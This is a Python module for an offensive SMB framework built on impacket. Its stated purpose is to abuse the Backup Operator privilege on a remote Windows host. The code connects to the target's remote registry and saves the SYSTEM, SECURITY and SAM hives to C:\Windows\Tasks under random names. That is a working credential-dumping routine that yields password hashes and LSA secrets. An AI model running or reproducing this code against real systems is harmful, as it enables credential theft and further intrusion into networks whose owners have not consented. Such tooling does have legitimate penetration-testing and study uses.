from rich.console import Console

from impacket.dcerpc.v5 import transport, rrp, scmr, rpcrt
from impacket.dcerpc.v5.rrp import MSRPC_UUID_RRP
from impacket.dcerpc.v5.scmr import MSRPC_UUID_SCMR
from impacket.smbconnection import SessionError
from impacket.examples.secretsdump import RemoteOperations, rrp
from impacket.dcerpc.v5.rpcrt import DCERPCException

from time import sleep
from random import choice

from handlers.smb_connection import SMBConnectionManager

console = Console()


class Backup:
    name = "backup"
    desc = "Abuse Backup Operator privilege to dump the SAM, SECURITY and SYSTEM files"
    module_protocol = ["smb"]
    opsec_safe = False
    multiple_hosts = False
    require_args = True
    min_args = 1

    # Credits: https://github.com/fortra/impacket/blob/7e25245e381a54045f5b039de9f7f9050f6c3c3c/examples/reg.py
    def strip_root_key(self, dce, keyName):
        try:
            rootKey = keyName.split('\\')[0]
            subKey = '\\'.join(keyName.split('\\')[1:])
        except Exception:
            raise Exception('Error parsing keyName %s' % keyName)
        if rootKey.upper() == 'HKLM':
            ans = rrp.hOpenLocalMachine(dce)
        else:
            raise Exception('Invalid root key %s ' % rootKey)
        hRootKey = ans['phKey']
        return hRootKey, subKey
    
    def random_string(self) -> None:
        random_chars = ['a', 'b', 'c', 'd', 'e', 'f', '1', '2', '3', '4', '5']
        random_str = []

        for _i in random_chars:
            char = choice(random_chars)
            random_str.append(char)

        return ''.join(random_str)
    
    def connect_registry(self, smb_con):
        rpc_registry = transport.DCERPCTransportFactory(r'ncacn_np:445[\pipe\winreg]')
        rpc_registry.set_smb_connection(smb_con)
        rrp_registry = rpc_registry.get_dce_rpc()
        rrp_registry.connect()
        rrp_registry.bind(MSRPC_UUID_RRP)
        return rrp_registry

    def connect_svc(self, smb_con):
        rpc_svc = transport.DCERPCTransportFactory(r'ncacn_np:445[\pipe\svcctl]')
        rpc_svc.set_smb_connection(smb_con)
        rrp_svc = rpc_svc.get_dce_rpc()
        rrp_svc.connect()
        rrp_svc.bind(MSRPC_UUID_SCMR)
        return rrp_svc
        
    def dump_hive(self, dce, key: str) -> None:
        hRootKey, subKey = self.strip_root_key(dce, key)
        ans2 = rrp.hBaseRegOpenKey(dce, hRootKey, subKey, dwOptions=rrp.REG_OPTION_BACKUP_RESTORE | rrp.REG_OPTION_OPEN_LINK, samDesired=rrp.KEY_READ)
        outputFileName = "%s\%s.%s" % ("C:\\Windows\\Tasks", subKey, self.random_string())
        rrp.hBaseRegSaveKey(dce, ans2['phkResult'], outputFileName)
        console.print(f" [cyan]-[/] {key} saved in: {outputFileName}", highlight=False)

    def on_login(self, target) -> None:
        if not target or len(target.split()) < 1:
            console.print("[red]Usage:[/] backup <target>")
            return
        
        target_ip = target.split()[0]
        smb_manager = SMBConnectionManager()
        smb_connection = smb_manager.get_smb_connection(target_ip) 
        console.print(f"[green][+][/] [yellow]{target_ip}[/] SMB connection successfully!", highlight=False)

        if smb_connection is None:
            console.print("[red][!][/] Unable to establish SMB connection.")
            return
        
        winreg_ipc = smb_connection.connectTree("IPC$")
        try:
            console.print("[yellow][!][/] Triggering WinReg...")
            smb_connection.openFile(winreg_ipc, r'\winreg', 0x12019f, creationOption=0x40, fileAttributes=0x80)
        except SessionError as error:
            console.print("[yellow][!][/] STATUS_PIPE_NOT_AVAILABLE (IPC$)")
            pass

        sleep(5)

        try:
            # Not necessary, but I think is a good idea to connect to svc anyways
            console.print("[yellow][!][/] Connecting to Svc")
            self.connect_svc(smb_connection)

            console.print("[yellow][!][/] Connecting to Registry")
            rrp_registry_connection = self.connect_registry(smb_connection)

            try:
                self.dump_hive(rrp_registry_connection, "HKLM\SYSTEM")
                self.dump_hive(rrp_registry_connection, "HKLM\SECURITY")
                self.dump_hive(rrp_registry_connection, "HKLM\SAM")
            except Exception as error:
                console.print(f"[red][!][/] Error when dumping SAM, SECURITY or SYSTEM hives: {error}", highlight=False)
                return
        except DCERPCException as auth_error:
            console.print(f"[red][!][/] Authentication failed on {target_ip}. {auth_error}", highlight=False)
            return
        except Exception as error:
            console.print(f"[red][!][/] Error: {error}", highlight=False)
            return